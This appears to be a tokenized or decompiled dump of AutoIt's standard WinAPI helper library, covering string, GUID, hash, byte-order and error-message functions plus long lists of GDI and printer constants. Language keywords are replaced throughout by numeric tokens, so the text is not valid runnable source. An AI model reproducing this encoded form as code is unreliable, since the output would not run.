28$SID=_WINAPI_GETSTRING($ARETURN[2])
_WINAPI_COTASKMEMFREE($ARETURN[2])
34$SID
33
32_WINAPI_RELEASESTREAM($PSTREAM)
28$ARETURN=58("oleaut32.dll","long","DispCallFunc","ptr",$PSTREAM,"ulong_ptr",8*(1+@AUTOITX64),"uint",4,"ushort",23,"uint",0,"ptr",0,"ptr",0,"str","")
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARETURN[0]534287(10,$ARETURN[0],0)
341
33
32_WINAPI_CHARTOOEM($SSTR)
28$ARET=58("user32.dll","bool","CharToOemW","wstr",$SSTR,"wstr","")
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34$ARET[2]
33
32_WINAPI_CLIENTTOSCREEN($HWND,36$TPOINT)
28$ARET=58("user32.dll","bool","ClientToScreen","hwnd",$HWND,"struct*",$TPOINT)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TPOINT
33
32_WINAPI_DWORDTOFLOAT($IVALUE)
28$TDWORD=65("dword")
28$TFLOAT=65("float",67($TDWORD))
69($TDWORD,1,$IVALUE)
3466($TFLOAT,1)
33
32_WINAPI_DWORDTOINT($IVALUE)
28$TDATA=65("int")
69($TDATA,1,$IVALUE)
3466($TDATA,1)
33
32_WINAPI_FLOATTODWORD($IVALUE)
28$TFLOAT=65("float")
28$TDWORD=65("dword",67($TFLOAT))
69($TFLOAT,1,$IVALUE)
3466($TDWORD,1)
33
32_WINAPI_FLOATTOINT($NFLOAT)
28$TFLOAT=65("float")
28$TINT=65("int",67($TFLOAT))
69($TFLOAT,1,$NFLOAT)
3466($TINT,1)
33
32_WINAPI_GETXYFROMPOINT(36$TPOINT,36$IX,36$IY)
$IX=66($TPOINT,"X")
$IY=66($TPOINT,"Y")
33
32_WINAPI_GUIDFROMSTRING($SGUID)
28$TGUID=65($TAGGUID)
_WINAPI_GUIDFROMSTRINGEX($SGUID,$TGUID)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
34$TGUID
33
32_WINAPI_GUIDFROMSTRINGEX($SGUID,$TGUID)
28$ARESULT=58("ole32.dll","long","CLSIDFromString","wstr",$SGUID,"struct*",$TGUID)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_HASHDATA($PMEMORY,$ISIZE,$ILENGTH=32)
4($ILENGTH<=0)2($ILENGTH>256)534287(11,0,0)
28$TDATA=65("byte["&$ILENGTH&"]")
28$ARET=58("shlwapi.dll","uint","HashData","struct*",$PMEMORY,"dword",$ISIZE,"struct*",$TDATA,"dword",$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,0)
4$ARET[0]534287(10,$ARET[0],0)
3466($TDATA,1)
33
32_WINAPI_HASHSTRING($SSTRING,$BCASESENSITIVE=39,$ILENGTH=32)
28$ILENGTHS=323($SSTRING)
43$ILENGTHS2($ILENGTH>256)534287(12,0,0)
28$TSTRING=65("wchar["&($ILENGTHS+1)&"]")
43$BCASESENSITIVE5
$SSTRING=324($SSTRING)
8
69($TSTRING,1,$SSTRING)
28$SHASH=_WINAPI_HASHDATA($TSTRING,2*$ILENGTHS,$ILENGTH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$SHASH
33
32_WINAPI_HIBYTE($IVALUE)
3417(21($IVALUE,8),255)
33
32_WINAPI_HIDWORD($IVALUE)
28$TINT64=65("int64")
28$TQWORD=65("dword;dword",67($TINT64))
69($TINT64,1,$IVALUE)
3466($TQWORD,2)
33
32_WINAPI_HIWORD($ILONG)
3421($ILONG,16)
33
32_WINAPI_INTTODWORD($IVALUE)
28$TDATA=65("dword")
69($TDATA,1,$IVALUE)
3466($TDATA,1)
33
32_WINAPI_INTTOFLOAT($IINT)
28$TINT=65("int")
28$TFLOAT=65("float",67($TINT))
69($TINT,1,$IINT)
3466($TFLOAT,1)
33
32_WINAPI_LOBYTE($IVALUE)
3417($IVALUE,255)
33
32_WINAPI_LODWORD($IVALUE)
28$TINT64=65("int64")
28$TQWORD=65("dword;dword",67($TINT64))
69($TINT64,1,$IVALUE)
3466($TQWORD,1)
33
32_WINAPI_LOWORD($ILONG)
3417($ILONG,65535)
33
32_WINAPI_LONGMID($IVALUE,$ISTART,$ICOUNT)
3417(21($IVALUE,$ISTART),19(21(21(2147483647,32-($ICOUNT+1)),1),21(1,-($ICOUNT-1))))
33
32_WINAPI_MAKELANGID($ILNGIDPRIMARY,$ILNGIDSUB)
3419(21($ILNGIDSUB,-10),$ILNGIDPRIMARY)
33
32_WINAPI_MAKELCID($ILNGID,$ISORTID)
3419(21($ISORTID,-16),$ILNGID)
33
32_WINAPI_MAKELONG($ILO,$IHI)
3419(21($IHI,-16),17($ILO,65535))
33
32_WINAPI_MAKEQWORD($ILODWORD,$IHIDWORD)
28$TINT64=65("uint64")
28$TDWORDS=65("dword;dword",67($TINT64))
69($TDWORDS,1,$ILODWORD)
69($TDWORDS,2,$IHIDWORD)
3466($TINT64,1)
33
32_WINAPI_MAKEWORD($ILO,$IHI)
28$TWORD=65("ushort")
28$TBYTE=65("byte;byte",67($TWORD))
69($TBYTE,1,$IHI)
69($TBYTE,2,$ILO)
3466($TWORD,1)
33
32_WINAPI_MULTIBYTETOWIDECHAR($VTEXT,$ICODEPAGE=0,$IFLAGS=0,$BRETSTRING=40)
28$STEXTTYPE="str"
43233($VTEXT)5$STEXTTYPE="struct*"
28$ARESULT=58("kernel32.dll","int","MultiByteToWideChar","uint",$ICODEPAGE,"dword",$IFLAGS,$STEXTTYPE,$VTEXT,"int",-1,"ptr",0,"int",0)
4@ERROR23$ARESULT[0]534287(@ERROR+10,@EXTENDED,0)
28$IOUT=$ARESULT[0]
28$TOUT=65("wchar["&$IOUT&"]")
$ARESULT=58("kernel32.dll","int","MultiByteToWideChar","uint",$ICODEPAGE,"dword",$IFLAGS,$STEXTTYPE,$VTEXT,"int",-1,"struct*",$TOUT,"int",$IOUT)
4@ERROR23$ARESULT[0]534287(@ERROR+20,@EXTENDED,0)
4$BRETSTRING53466($TOUT,1)
34$TOUT
33
32_WINAPI_MULTIBYTETOWIDECHAREX($STEXT,$PTEXT,$ICODEPAGE=0,$IFLAGS=0)
28$ARESULT=58("kernel32.dll","int","MultiByteToWideChar","uint",$ICODEPAGE,"dword",$IFLAGS,"STR",$STEXT,"int",-1,"struct*",$PTEXT,"int",(323($STEXT)+1)*2)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_OEMTOCHAR($SSTR)
28$ARET=58("user32.dll","bool","OemToChar","str",$SSTR,"str","")
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34$ARET[2]
33
32_WINAPI_POINTFROMRECT(36$TRECT,$BCENTER=39)
28$IX1=66($TRECT,"Left")
28$IY1=66($TRECT,"Top")
28$IX2=66($TRECT,"Right")
28$IY2=66($TRECT,"Bottom")
4$BCENTER5
$IX1=$IX1+(($IX2-$IX1)/2)
$IY1=$IY1+(($IY2-$IY1)/2)
8
28$TPOINT=65($TAGPOINT)
69($TPOINT,"X",$IX1)
69($TPOINT,"Y",$IY1)
34$TPOINT
33
32_WINAPI_PRIMARYLANGID($ILNGID)
3417($ILNGID,1023)
33
32_WINAPI_SCREENTOCLIENT($HWND,36$TPOINT)
28$ARESULT=58("user32.dll","bool","ScreenToClient","hwnd",$HWND,"struct*",$TPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SHORTTOWORD($IVALUE)
3417($IVALUE,65535)
33
32_WINAPI_STRFORMATBYTESIZE($ISIZE)
28$ARET=58("shlwapi.dll","ptr","StrFormatByteSizeW","int64",$ISIZE,"wstr","","uint",1024)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34$ARET[2]
33
32_WINAPI_STRFORMATBYTESIZEEX($ISIZE)
28$ASYMBOL=58("kernel32.dll","int","GetLocaleInfoW","dword",1024,"dword",15,"wstr","","int",2048)
4@ERROR534287(@ERROR+10,@EXTENDED,"")
28$SSIZE=_WINAPI_STRFORMATBYTESIZE(0)
4@ERROR534287(@ERROR,@EXTENDED,"")
34328($SSIZE,"0",327(250($ISIZE),"(?<=\d)(?=(\d{3})+\z)",$ASYMBOL[3]))
33
32_WINAPI_STRFORMATKBSIZE($ISIZE)
28$ARET=58("shlwapi.dll","ptr","StrFormatKBSizeW","int64",$ISIZE,"wstr","","uint",1024)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34$ARET[2]
33
32_WINAPI_STRFROMTIMEINTERVAL($ITIME,$IDIGITS=7)
28$ARET=58("shlwapi.dll","int","StrFromTimeIntervalW","wstr","","uint",1024,"dword",$ITIME,"int",$IDIGITS)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,"")
34333($ARET[1],$STR_STRIPLEADING+$STR_STRIPTRAILING)
33
32_WINAPI_STRINGFROMGUID($TGUID)
28$ARESULT=58("ole32.dll","int","StringFromGUID2","struct*",$TGUID,"wstr","","int",40)
4@ERROR23$ARESULT[0]534287(@ERROR,@EXTENDED,"")
34288($ARESULT[0],$ARESULT[2])
33
32_WINAPI_SUBLANGID($ILNGID)
3421($ILNGID,10)
33
32_WINAPI_SWAPDWORD($IVALUE)
28$TSTRUCT1=65("dword;dword")
28$TSTRUCT2=65("byte[4];byte[4]",67($TSTRUCT1))
69($TSTRUCT1,1,$IVALUE)
13$I=1154
69($TSTRUCT2,2,66($TSTRUCT2,1,5-$I),$I)
14
3466($TSTRUCT1,2)
33
32_WINAPI_SWAPQWORD($IVALUE)
28$TSTRUCT1=65("int64;int64")
28$TSTRUCT2=65("byte[8];byte[8]",67($TSTRUCT1))
69($TSTRUCT1,1,$IVALUE)
13$I=1158
69($TSTRUCT2,2,66($TSTRUCT2,1,9-$I),$I)
14
3466($TSTRUCT1,2)
33
32_WINAPI_SWAPWORD($IVALUE)
28$TSTRUCT1=65("word;word")
28$TSTRUCT2=65("byte[2];byte[2]",67($TSTRUCT1))
69($TSTRUCT1,1,$IVALUE)
13$I=1152
69($TSTRUCT2,2,66($TSTRUCT2,1,3-$I),$I)
14
3466($TSTRUCT1,2)
33
32_WINAPI_WIDECHARTOMULTIBYTE($VUNICODE,$ICODEPAGE=0,$BRETNOSTRUCT=39,$BRETBINARY=40)
28$SUNICODETYPE="wstr"
43233($VUNICODE)5$SUNICODETYPE="struct*"
28$ARESULT=58("kernel32.dll","int","WideCharToMultiByte","uint",$ICODEPAGE,"dword",0,$SUNICODETYPE,$VUNICODE,"int",-1,"ptr",0,"int",0,"ptr",0,"ptr",0)
4@ERROR23$ARESULT[0]534287(@ERROR+20,@EXTENDED,"")
28$TMULTIBYTE=65((($BRETBINARY)("byte")("char"))&"["&$ARESULT[0]&"]")
$ARESULT=58("kernel32.dll","int","WideCharToMultiByte","uint",$ICODEPAGE,"dword",0,$SUNICODETYPE,$VUNICODE,"int",-1,"struct*",$TMULTIBYTE,"int",$ARESULT[0],"ptr",0,"ptr",0)
4@ERROR23$ARESULT[0]534287(@ERROR+10,@EXTENDED,"")
4$BRETNOSTRUCT53466($TMULTIBYTE,1)
34$TMULTIBYTE
33
32_WINAPI_WORDTOSHORT($IVALUE)
417($IVALUE,32768)5
3419($IVALUE,-32768)
8
3417($IVALUE,32767)
33
2930$FR_PRIVATE=16
2930$FR_NOT_ENUM=32
2930$COMPRESSION_BITMAP_PNG=0
2930$COMPRESSION_BITMAP_JPEG=1
2930$BS_DIBPATTERN=5
2930$BS_DIBPATTERN8X8=8
2930$BS_DIBPATTERNPT=6
2930$BS_HATCHED=2
2930$BS_HOLLOW=1
2930$BS_NULL=1
2930$BS_PATTERN=3
2930$BS_PATTERN8X8=7
2930$BS_SOLID=0
2930$HS_BDIAGONAL=3
2930$HS_CROSS=4
2930$HS_DIAGCROSS=5
2930$HS_FDIAGONAL=2
2930$HS_HORIZONTAL=0
2930$HS_VERTICAL=1
2930$DIB_PAL_COLORS=1
2930$DIB_RGB_COLORS=0
2930$CA_NEGATIVE=1
2930$CA_LOG_FILTER=2
2930$ILLUMINANT_DEVICE_DEFAULT=0
2930$ILLUMINANT_A=1
2930$ILLUMINANT_B=2
2930$ILLUMINANT_C=3
2930$ILLUMINANT_D50=4
2930$ILLUMINANT_D55=5
2930$ILLUMINANT_D65=6
2930$ILLUMINANT_D75=7
2930$ILLUMINANT_F2=8
2930$ILLUMINANT_TUNGSTEN=$ILLUMINANT_A
2930$ILLUMINANT_DAYLIGHT=$ILLUMINANT_C
2930$ILLUMINANT_FLUORESCENT=$ILLUMINANT_F2
2930$ILLUMINANT_NTSC=$ILLUMINANT_C
2930$BI_RGB=0
2930$BI_RLE8=1
2930$BI_RLE4=2
2930$BI_BITFIELDS=3
2930$BI_JPEG=4
2930$BI_PNG=5
2930$ALTERNATE=1
2930$WINDING=2
2930$DWMWA_NCRENDERING_ENABLED=1
2930$DWMWA_NCRENDERING_POLICY=2
2930$DWMWA_TRANSITIONS_FORCEDISABLED=3
2930$DWMWA_ALLOW_NCPAINT=4
2930$DWMWA_CAPTION_BUTTON_BOUNDS=5
2930$DWMWA_NONCLIENT_RTL_LAYOUT=6
2930$DWMWA_FORCE_ICONIC_REPRESENTATION=7
2930$DWMWA_FLIP3D_POLICY=8
2930$DWMWA_EXTENDED_FRAME_BOUNDS=9
2930$DWMWA_HAS_ICONIC_BITMAP=10
2930$DWMWA_DISALLOW_PEEK=11
2930$DWMWA_EXCLUDED_FROM_PEEK=12
2930$DWMNCRP_USEWINDOWSTYLE=0
2930$DWMNCRP_DISABLED=1
2930$DWMNCRP_ENABLED=2
2930$DWMFLIP3D_DEFAULT=0
2930$DWMFLIP3D_EXCLUDEBELOW=1
2930$DWMFLIP3D_EXCLUDEABOVE=2
2930$DM_BITSPERPEL=262144
2930$DM_COLLATE=32768
2930$DM_COLOR=2048
2930$DM_COPIES=256
2930$DM_DEFAULTSOURCE=512
2930$DM_DISPLAYFIXEDOUTPUT=536870912
2930$DM_DISPLAYFLAGS=2097152
2930$DM_DISPLAYFREQUENCY=4194304
2930$DM_DISPLAYORIENTATION=128
2930$DM_DITHERTYPE=67108864
2930$DM_DUPLEX=4096
2930$DM_FORMNAME=65536
2930$DM_ICMINTENT=16777216
2930$DM_ICMMETHOD=8388608
2930$DM_LOGPIXELS=131072
2930$DM_MEDIATYPE=33554432
2930$DM_NUP=64
2930$DM_ORIENTATION=1
2930$DM_PANNINGHEIGHT=268435456
2930$DM_PANNINGWIDTH=134217728
2930$DM_PAPERLENGTH=4
2930$DM_PAPERSIZE=2
2930$DM_PAPERWIDTH=8
2930$DM_PELSHEIGHT=1048576
2930$DM_PELSWIDTH=524288
2930$DM_POSITION=32
2930$DM_PRINTQUALITY=1024
2930$DM_SCALE=16
2930$DM_TTOPTION=16384
2930$DM_YRESOLUTION=8192
2930$DMPAPER_LETTER=1
2930$DMPAPER_LETTERSMALL=2
2930$DMPAPER_TABLOID=3
2930$DMPAPER_LEDGER=4
2930$DMPAPER_LEGAL=5
2930$DMPAPER_STATEMENT=6
2930$DMPAPER_EXECUTIVE=7
2930$DMPAPER_A3=8
2930$DMPAPER_A4=9
2930$DMPAPER_A4SMALL=10
2930$DMPAPER_A5=11
2930$DMPAPER_B4=12
2930$DMPAPER_B5=13
2930$DMPAPER_FOLIO=14
2930$DMPAPER_QUARTO=15
2930$DMPAPER_10X14=16
2930$DMPAPER_11X17=17
2930$DMPAPER_NOTE=18
2930$DMPAPER_ENV_9=19
2930$DMPAPER_ENV_10=20
2930$DMPAPER_ENV_11=21
2930$DMPAPER_ENV_12=22
2930$DMPAPER_ENV_14=23
2930$DMPAPER_CSHEET=24
2930$DMPAPER_DSHEET=25
2930$DMPAPER_ESHEET=26
2930$DMPAPER_ENV_DL=27
2930$DMPAPER_ENV_C5=28
2930$DMPAPER_ENV_C3=29
2930$DMPAPER_ENV_C4=30
2930$DMPAPER_ENV_C6=31
2930$DMPAPER_ENV_C65=32
2930$DMPAPER_ENV_B4=33
2930$DMPAPER_ENV_B5=34
2930$DMPAPER_ENV_B6=35
2930$DMPAPER_ENV_ITALY=36
2930$DMPAPER_ENV_MONARCH=37
2930$DMPAPER_ENV_PERSONAL=38
2930$DMPAPER_FANFOLD_US=39
2930$DMPAPER_FANFOLD_STD_GERMAN=40
2930$DMPAPER_FANFOLD_LGL_GERMAN=41
2930$DMPAPER_ISO_B4=42
2930$DMPAPER_JAPANESE_POSTCARD=43
2930$DMPAPER_9X11=44
2930$DMPAPER_10X11=45
2930$DMPAPER_15X11=46
2930$DMPAPER_ENV_INVITE=47
2930$DMPAPER_RESERVED_48=48
2930$DMPAPER_RESERVED_49=49
2930$DMPAPER_LETTER_EXTRA=50
2930$DMPAPER_LEGAL_EXTRA=51
2930$DMPAPER_TABLOID_EXTRA=52
2930$DMPAPER_A4_EXTRA=53
2930$DMPAPER_LETTER_TRANSVERSE=54
2930$DMPAPER_A4_TRANSVERSE=55
2930$DMPAPER_LETTER_EXTRA_TRANSVERSE=56
2930$DMPAPER_A_PLUS=57
2930$DMPAPER_B_PLUS=58
2930$DMPAPER_LETTER_PLUS=59
2930$DMPAPER_A4_PLUS=60
2930$DMPAPER_A5_TRANSVERSE=61
2930$DMPAPER_B5_TRANSVERSE=62
2930$DMPAPER_A3_EXTRA=63
2930$DMPAPER_A5_EXTRA=64
2930$DMPAPER_B5_EXTRA=65
2930$DMPAPER_A2=66
2930$DMPAPER_A3_TRANSVERSE=67
2930$DMPAPER_A3_EXTRA_TRANSVERSE=68
2930$DMPAPER_DBL_JAPANESE_POSTCARD=69
2930$DMPAPER_A6=70
2930$DMPAPER_JENV_KAKU2=71
2930$DMPAPER_JENV_KAKU3=72
2930$DMPAPER_JENV_CHOU3=73
2930$DMPAPER_JENV_CHOU4=74
2930$DMPAPER_LETTER_ROTATED=75
2930$DMPAPER_A3_ROTATED=76
2930$DMPAPER_A4_ROTATED=77
2930$DMPAPER_A5_ROTATED=78
2930$DMPAPER_B4_JIS_ROTATED=79
2930$DMPAPER_B5_JIS_ROTATED=80
2930$DMPAPER_JAPANESE_POSTCARD_ROTATED=81
2930$DMPAPER_DBL_JAPANESE_POSTCARD_ROTATED=82
2930$DMPAPER_A6_ROTATED=83
2930$DMPAPER_JENV_KAKU2_ROTATED=84
2930$DMPAPER_JENV_KAKU3_ROTATED=85
2930$DMPAPER_JENV_CHOU3_ROTATED=86
2930$DMPAPER_JENV_CHOU4_ROTATED=87
2930$DMPAPER_B6_JIS=88
2930$DMPAPER_B6_JIS_ROTATED=89
2930$DMPAPER_12X11=90
2930$DMPAPER_JENV_YOU4=91
2930$DMPAPER_JENV_YOU4_ROTATED=92
2930$DMPAPER_P16K=93
2930$DMPAPER_P32K=94
2930$DMPAPER_P32KBIG=95
2930$DMPAPER_PENV_1=96
2930$DMPAPER_PENV_2=97
2930$DMPAPER_PENV_3=98
2930$DMPAPER_PENV_4=99
2930$DMPAPER_PENV_5=100
2930$DMPAPER_PENV_6=101
2930$DMPAPER_PENV_7=102
2930$DMPAPER_PENV_8=103
2930$DMPAPER_PENV_9=104
2930$DMPAPER_PENV_10=105
2930$DMPAPER_P16K_ROTATED=106
2930$DMPAPER_P32K_ROTATED=107
2930$DMPAPER_P32KBIG_ROTATED=108
2930$DMPAPER_PENV_1_ROTATED=109
2930$DMPAPER_PENV_2_ROTATED=110
2930$DMPAPER_PENV_3_ROTATED=111
2930$DMPAPER_PENV_4_ROTATED=112
2930$DMPAPER_PENV_5_ROTATED=113
2930$DMPAPER_PENV_6_ROTATED=114
2930$DMPAPER_PENV_7_ROTATED=115
2930$DMPAPER_PENV_8_ROTATED=116
2930$DMPAPER_PENV_9_ROTATED=117
2930$DMPAPER_PENV_10_ROTATED=118
2930$DMPAPER_USER=256
2930$DMBIN_UPPER=1
2930$DMBIN_LOWER=2
2930$DMBIN_MIDDLE=3
2930$DMBIN_MANUAL=4
2930$DMBIN_ENVELOPE=5
2930$DMBIN_ENVMANUAL=6
2930$DMBIN_AUTO=7
2930$DMBIN_TRACTOR=8
2930$DMBIN_SMALLFMT=9
2930$DMBIN_LARGEFMT=10
2930$DMBIN_LARGECAPACITY=11
2930$DMBIN_CASSETTE=14
2930$DMBIN_FORMSOURCE=15
2930$DMBIN_USER=256
2930$DMRES_DRAFT=-1
2930$DMRES_LOW=-2
2930$DMRES_MEDIUM=-3
2930$DMRES_HIGH=-4
2930$DMDO_DEFAULT=0
2930$DMDO_90=1
2930$DMDO_180=2
2930$DMDO_270=3
2930$DMDFO_DEFAULT=0
2930$DMDFO_STRETCH=1
2930$DMDFO_CENTER=2
2930$DMCOLOR_MONOCHROME=1
2930$DMCOLOR_COLOR=2
2930$DMDUP_SIMPLEX=1
2930$DMDUP_VERTICAL=2
2930$DMDUP_HORIZONTAL=3
2930$DMTT_BITMAP=1
2930$DMTT_DOWNLOAD=2
2930$DMTT_SUBDEV=3
2930$DMTT_DOWNLOAD_OUTLINE=4
2930$DMCOLLATE_FALSE=0
2930$DMCOLLATE_TRUE=1
2930$DM_GRAYSCALE=1
2930$DM_INTERLACED=2
2930$DMNUP_SYSTEM=1
2930$DMNUP_ONEUP=2
2930$DMICMMETHOD_NONE=1
2930$DMICMMETHOD_SYSTEM=2
2930$DMICMMETHOD_DRIVER=3
2930$DMICMMETHOD_DEVICE=4
2930$DMICMMETHOD_USER=256
2930$DMICM_SATURATE=1
2930$DMICM_CONTRAST=2
2930$DMICM_COLORIMETRIC=3
2930$DMICM_ABS_COLORIMETRIC=4
2930$DMICM_USER=256
2930$DMMEDIA_STANDARD=1
2930$DMMEDIA_TRANSPARENCY=2
2930$DMMEDIA_GLOSSY=3
2930$DMMEDIA_USER=256
2930$DMDITHER_NONE=1
2930$DMDITHER_COARSE=2
2930$DMDITHER_FINE=3
2930$DMDITHER_LINEART=4
2930$DMDITHER_ERRORDIFFUSION=5
2930$DMDITHER_RESERVED6=6
2930$DMDITHER_RESERVED7=7
2930$DMDITHER_RESERVED8=8
2930$DMDITHER_RESERVED9=9
2930$DMDITHER_GRAYSCALE=10
2930$DMDITHER_USER=256
2930$ENUM_CURRENT_SETTINGS=-1
2930$ENUM_REGISTRY_SETTINGS=-2
2930$DEVICE_FONTTYPE=2
2930$RASTER_FONTTYPE=1
2930$TRUETYPE_FONTTYPE=4
2930$NTM_BOLD=32
2930$NTM_DSIG=2097152
2930$NTM_ITALIC=1
2930$NTM_MULTIPLEMASTER=524288
2930$NTM_NONNEGATIVE_AC=65536
2930$NTM_PS_OPENTYPE=131072
2930$NTM_REGULAR=64
2930$NTM_TT_OPENTYPE=262144
2930$NTM_TYPE1=1048576
2930$FLOODFILLBORDER=0
2930$FLOODFILLSURFACE=1
2930$AD_COUNTERCLOCKWISE=1
2930$AD_CLOCKWISE=2
2930$DCB_ACCUMULATE=2
2930$DCB_DISABLE=8
2930$DCB_ENABLE=4
2930$DCB_RESET=1
2930$DCB_SET=19($DCB_RESET,$DCB_ACCUMULATE)
2930$DCX_WINDOW=1
2930$DCX_CACHE=2
2930$DCX_PARENTCLIP=32
2930$DCX_CLIPSIBLINGS=16
2930$DCX_CLIPCHILDREN=8
2930$DCX_NORESETATTRS=4
2930$DCX_LOCKWINDOWUPDATE=1024
2930$DCX_EXCLUDERGN=64
2930$DCX_INTERSECTRGN=128
2930$DCX_INTERSECTUPDATE=512
2930$DCX_VALIDATE=2097152
2930$GGO_BEZIER=3
2930$GGO_BITMAP=1
2930$GGO_GLYPH_INDEX=128
2930$GGO_GRAY2_BITMAP=4
2930$GGO_GRAY4_BITMAP=5
2930$GGO_GRAY8_BITMAP=6
2930$GGO_METRICS=0
2930$GGO_NATIVE=2
2930$GGO_UNHINTED=256
2930$GM_COMPATIBLE=1
2930$GM_ADVANCED=2
2930$MM_ANISOTROPIC=8
2930$MM_HIENGLISH=5
2930$MM_HIMETRIC=3
2930$MM_ISOTROPIC=7
2930$MM_LOENGLISH=4
2930$MM_LOMETRIC=2
2930$MM_TEXT=1
2930$MM_TWIPS=6
2930$R2_BLACK=1
2930$R2_COPYPEN=13
2930$R2_LAST=16
2930$R2_MASKNOTPEN=3
2930$R2_MASKPEN=9
2930$R2_MASKPENNOT=5
2930$R2_MERGENOTPEN=12
2930$R2_MERGEPEN=15
2930$R2_MERGEPENNOT=14
2930$R2_NOP=11
2930$R2_NOT=6
2930$R2_NOTCOPYPEN=4
2930$R2_NOTMASKPEN=8
2930$R2_NOTMERGEPEN=2
2930$R2_NOTXORPEN=10
2930$R2_WHITE=16
2930$R2_XORPEN=7
2930$BLACKONWHITE=1
2930$COLORONCOLOR=3
2930$HALFTONE=4
2930$WHITEONBLACK=2
2930$STRETCH_ANDSCANS=$BLACKONWHITE
2930$STRETCH_DELETESCANS=$COLORONCOLOR
2930$STRETCH_HALFTONE=$HALFTONE
2930$STRETCH_ORSCANS=$WHITEONBLACK
2930$TA_BASELINE=24
2930$TA_BOTTOM=8
2930$TA_TOP=0
2930$TA_CENTER=6
2930$TA_LEFT=0
2930$TA_RIGHT=2
2930$TA_NOUPDATECP=0
2930$TA_RTLREADING=256
2930$TA_UPDATECP=1
2930$VTA_BASELINE=$TA_BASELINE
2930$VTA_BOTTOM=$TA_RIGHT
2930$VTA_TOP=$TA_LEFT
2930$VTA_CENTER=$TA_CENTER
2930$VTA_LEFT=$TA_BOTTOM
2930$VTA_RIGHT=$TA_TOP
2930$UDF_BGR=1
2930$UDF_RGB=0
2930$MWT_IDENTITY=1
2930$MWT_LEFTMULTIPLY=2
2930$MWT_RIGHTMULTIPLY=3
2930$MWT_SET=4
2930$MONITOR_DEFAULTTONEAREST=2
2930$MONITOR_DEFAULTTONULL=0
2930$MONITOR_DEFAULTTOPRIMARY=1
2930$PT_BEZIERTO=4
2930$PT_LINETO=2
2930$PT_MOVETO=6
2930$PT_CLOSEFIGURE=1
2930$FORMAT_MESSAGE_ALLOCATE_BUFFER=256
2930$FORMAT_MESSAGE_IGNORE_INSERTS=512
2930$FORMAT_MESSAGE_FROM_STRING=1024
2930$FORMAT_MESSAGE_FROM_HMODULE=2048
2930$FORMAT_MESSAGE_FROM_SYSTEM=4096
2930$FORMAT_MESSAGE_ARGUMENT_ARRAY=8192
32_WINAPI_BEEP($IFREQ=500,$IDURATION=1000)
28$ARESULT=58("kernel32.dll","bool","Beep","dword",$IFREQ,"dword",$IDURATION)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_FORMATMESSAGE($IFLAGS,$PSOURCE,$IMESSAGEID,$ILANGUAGEID,36$PBUFFER,$ISIZE,$VARGUMENTS)
28$SBUFFERTYPE="struct*"
4233($PBUFFER)5$SBUFFERTYPE="wstr"
28$ARESULT=58("kernel32.dll","dword","FormatMessageW","dword",$IFLAGS,"struct*",$PSOURCE,"dword",$IMESSAGEID,"dword",$ILANGUAGEID,$SBUFFERTYPE,$PBUFFER,"dword",$ISIZE,"ptr",$VARGUMENTS)
4@ERROR23$ARESULT[0]534287(@ERROR+10,@EXTENDED,0)
4$SBUFFERTYPE="wstr"5$PBUFFER=$ARESULT[5]
34$ARESULT[0]
33
32_WINAPI_GETERRORMESSAGE($ICODE,$ILANGUAGE=0,30$_ICURRENTERROR=@ERROR,30$_ICURRENTEXTENDED=@EXTENDED)
28$ARET=58("kernel32.dll","dword","FormatMessageW","dword",4096,"ptr",0,"dword",$ICODE,"dword",$ILANGUAGE,"wstr","","dword",4096,"ptr",0)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,"")
34287($_ICURRENTERROR,$_ICURRENTEXTENDED,327($ARET[5],"["&@LF&","&@CR&"]*\Z",""))
33
32_WINAPI_GETLASTERROR(30$_ICURRENTERROR=@ERROR,30$_ICURRENTEXTENDED=@EXTENDED)
28$ARESULT=58("kernel32.dll","dword","GetLastError")
34287($_ICURRENTERROR,$_ICURRENTEXTENDED,$ARESULT[0])
33
32_WINAPI_GETLASTERRORMESSAGE(30$_ICURRENTERROR=@ERROR,30$_ICURRENTEXTENDED=@EXTENDED)
28$ILASTERROR=_WINAPI_GETLASTERROR()
28$TBUFFERPTR=65("ptr")
28$NCOUNT=_WINAPI_FORMATMESSAGE(19($FORMAT_MESSAGE_ALLOCATE_BUFFER,$FORMAT_MESSAGE_FROM_SYSTEM),0,$ILASTERROR,0,$TBUFFERPTR,0,0)
4@ERROR534287(-@ERROR,@EXTENDED,"")
28$STEXT=""
28$PBUFFER=66($TBUFFERPTR,1)
4$PBUFFER5
4$NCOUNT>05
28$TBUFFER=65("wchar["&($NCOUNT+1)&"]",$PBUFFER)
$STEXT=66($TBUFFER,1)
4330($STEXT,2)=@CRLF5$STEXT=337($STEXT,2)
8
58("kernel32.dll","handle","LocalFree","handle",$PBUFFER)
8
34287($_ICURRENTERROR,$_ICURRENTEXTENDED,$STEXT)
33
32_WINAPI_MESSAGEBEEP($ITYPE=1)
28$ISOUND
23$ITYPE
211
$ISOUND=0
212
$ISOUND=16
213
$ISOUND=32
214
$ISOUND=48
215
$ISOUND=64
216
$ISOUND=-1
24
28$ARESULT=58("user32.dll","bool","MessageBeep","uint",$ISOUND)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_MSGBOX($IFLAGS,$STITLE,$STEXT)
23(0)
249($IFLAGS,$STITLE,$STEXT&"      ")
33
32_WINAPI_SETLASTERROR($IERRORCODE,30$_ICURRENTERROR=@ERROR,30$_ICURRENTEXTENDED=@EXTENDED)
58("kernel32.dll","none","SetLastError","dword",$IERRORCODE)
34287($_ICURRENTERROR,$_ICURRENTEXTENDED,42)
33
32_WINAPI_SHOWERROR($STEXT,$BEXIT=39)
23(0)
249($MB_SYSTEMMODAL,"Error",$STEXT&"      ")
